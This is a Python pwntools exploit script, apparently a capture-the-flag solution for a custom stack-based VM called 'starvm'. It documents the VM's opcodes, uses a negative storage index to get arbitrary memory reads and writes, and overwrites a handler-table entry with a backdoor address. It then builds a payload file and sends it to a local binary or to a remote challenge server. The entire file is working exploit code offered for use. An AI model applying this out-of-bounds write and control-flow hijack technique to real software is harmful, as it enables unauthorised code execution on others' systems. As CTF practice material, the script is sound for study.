#!/usr/bin/env python3
from pwn import *
import subprocess 
import os 
import argparse 

parser = argparse.ArgumentParser()
parser.add_argument("--delete", action="store_true", help="Delete the temporary file")
parser.add_argument("--run", action="store_true", help="Run the starvm with the payload")
parser.add_argument("--remote", action="store_true", help="Connect to remote server instead of local")
args = parser.parse_args()


# these have fixed diff
STORAGE_BASE = 0x7ffffffeaef0
STACK_BASE   = STORAGE_BASE + 0x8000 + 0x1000 * 8
HANDLER_TABLE_BASE = STACK_BASE + 0x6 * 8

def print_stack_length():
    # print stack length? 
    # store + 9, read + 1
    return p8(0x01)

def read_to_stack():
    """
    read from stdin to stack in hex (max 16 characters) 
    stack[-1] = bytes.fromhex(input())
    """
    return p8(0x60)

def load_to_stack(value, signed=False):
    """
    load immediate value to stack in bytes 
    stack.push(<8-byte>)
    usage: 0x10 <8-byte> 
    """
    b = b""
    b += p8(0x10)  # LOAD
    b += p64(value, signed=signed) 
    return b 

def pop_stack():
    """
    pop top stack value 
    stack.pop()
    """
    return p8(0x11)

def dup_stack(pos):
    """
    duplicate stack value at position pos (0-indexed from top)
    stack.push(stack[-(pos+1)])
    usage: 0x12 <pos>
    """
    return p8(0x12) + p8(pos)

def stack_to_storage():
    """
    0x000000000102f615 around
    mov    rsi, qword ptr [rax + rdi*8 + 0x8008]
    mov    qword ptr [rax + rdx*8], rsi              

    rax: storage
    rax + 0x8008: stack 

    rdx = top-most qword
    rsi = second top-most qword
    -> storage[stack[-1]] = stack[-2]
    """
    return p8(0x13)

def read_from_storage():
    """
    read from storage to stack 
    index = stack.pop()
    stack.push(storage[index])
    """
    return p8(0x14)

def add_stack():
    """
    add top two stack values 
    a = stack.pop()
    b = stack.pop()
    stack.push(a + b)
    """
    return p8(0x20)

def sub_stack():
    """
    sub top two stack values 
    a = stack.pop()
    b = stack.pop()
    stack.push(a - b)
    """
    return p8(0x21)

def mul_stack():
    """
    mul top two stack values 
    a = stack.pop()
    b = stack.pop()
    stack.push(a * b)
    """
    return p8(0x22)

def div_stack():
    """
    div top two stack values 
    a = stack.pop()
    b = stack.pop()
    stack.push(a // b)
    """
    return p8(0x23)

def and_stack():
    """
    and top two stack values 
    a = stack.pop()
    b = stack.pop()
    stack.push(a & b)
    """
    return p8(0x30)

def or_stack():
    """
    or top two stack values 
    a = stack.pop()
    b = stack.pop()
    stack.push(a | b)
    """
    return p8(0x31)

def xor_stack():
    """
    xor top two stack values 
    a = stack.pop()
    b = stack.pop()
    stack.push(a ^ b)
    """
    return p8(0x32)

def jump_if_equal(offset):
    """
    jump by p32(offset) if stack[-1] == stack[-2]
    usage: 0x40 + 0x43 <offset>
    """
    return p8(0x40) + p32(0x43) + p32(offset)

"""
common pattern
a. 60 10 <index> 13 -> read some value, and store to storage[index]
b. 12 02 14 | 12 02 14
-> stack is ret addr | 14 | 00 when called
-> so stack[-3] == 00 is the index, we read storage[0] to stack
-> next, stack[-2] == 14, we read storage[14] to stack
-> this is to read one storage element and one thing we wrote to stack.
"""

def call_function(index):
    """
    call function at index in function table and push return address
    stack.push(PC+1); PC = function_table[index]
    usage: load_to_stack(index) + 0x50
    """
    return load_to_stack(index) + p8(0x50)

def jump_to_addr(addr):
    """
    jump to absolute address addr
    usage: load_to_stack(addr) + 0x51
    """
    return load_to_stack(addr) + p8(0x51)

def print_stack():
    """
    print stack value at top
    """
    return p8(0x61)


# Note the addr can be the one before randominzation as they're relative to same base
def write_at(addr, val):
    """
    write val at addr 
"""
    b = b""
    overflow_index = (addr - STORAGE_BASE) // 8
    b += load_to_stack(val)
    b += load_to_stack(overflow_index, signed=True)
    b += stack_to_storage()
    return b

def write_at_without_load(addr):
    """
    write top of stack at addr 
    """
    b = b""
    overflow_index = (addr - STORAGE_BASE) // 8
    b += load_to_stack(overflow_index, signed=True)
    b += stack_to_storage()
    return b

def read_at(addr):
    """
    read from addr to stack 
    """
    b = b""
    overflow_index = (addr - STORAGE_BASE) // 8
    b += load_to_stack(overflow_index, signed=True)
    b += read_from_storage()
    return b

BACKDOOR = 0x102ee90

program = b""
# program += write_at(SOME_FLAG, 0x1)  # set flag to 1
# program += write_at(SOME_FLAG2, 0x0)  # set flag2 to 0
# program += write_at(SOME_FLAG3, 0x1)  # set flag3
program += write_at(HANDLER_TABLE_BASE + 8 * 2, BACKDOOR)  # set handler 2 to ret addr
program += p8(0x2)
len_main = 0x2000
program = program.ljust(len_main, b'\x00')

print(f"len main: {len_main}, content: {program.hex()[:64]}...")


# Payload construction
with open('payload', 'wb') as f:
    f.write(b"STARP")

    # function
    f.write(p32(1))
    f.write(p32(0))

    # storage
    f.write(p32(0))
    
    # program
    f.write(p32(len_main))
    f.write(program) 
    f.flush()
  
if args.run or args.delete:
    with open('payload', 'rb') as f:
        if args.run:
            if args.remote:
                p = remote('10.113.0.1', 10302)
                file_bytes = f.read()
                p.sendlineafter(b'size > ', str(len(file_bytes)).encode())
                print(f'sending {len(file_bytes)} bytes: {file_bytes}')
                p.sendline(file_bytes)
                print(p.readlines(2))
            else:
                result = subprocess.run(["./src/share/starvm", f.name], capture_output=True)
                print(f"output:\n{result.stdout.decode()}")
                print(f"error (if any):\n{result.stderr.decode()}")

        if args.delete:
            os.remove(f.name)
        else:
            print(f"Temporary file kept at: {f.name}")
